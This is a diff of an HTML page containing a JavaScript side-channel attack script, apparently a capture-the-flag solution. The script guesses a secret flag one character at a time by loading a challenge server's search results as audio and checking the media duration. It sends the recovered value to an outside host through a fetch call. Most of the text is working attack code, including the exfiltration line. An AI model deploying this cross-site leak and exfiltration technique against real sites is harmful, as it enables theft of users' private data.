@@ -9,7 +9,6 @@
 
 <body>
 <img src="https://lyj.kr/asdf" alt="asdf">
-</body>
 <script>
     const $ = document;
     let chars = ` !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_\`abcdefghijklmnopqrstuvwxyz{|}~`;
@@ -19,7 +18,7 @@
     }
 x
     function send(char) {
-        new Audio("https://lyj.kr/debug" + flag);
+        fetch("https://lyj.kr/debug" + flag);
         const audio2 = new Audio(`http://prob.hspace.io:26019/search?query=${encodeURIComponent(flag + char)}`);
         audio2.addEventListener('canplaythrough', (e) => {
             if (audio2.duration == 30.1) {
@@ -38,5 +37,5 @@ x
     }
     brute()
 </script>
-
+</body>
 </html>
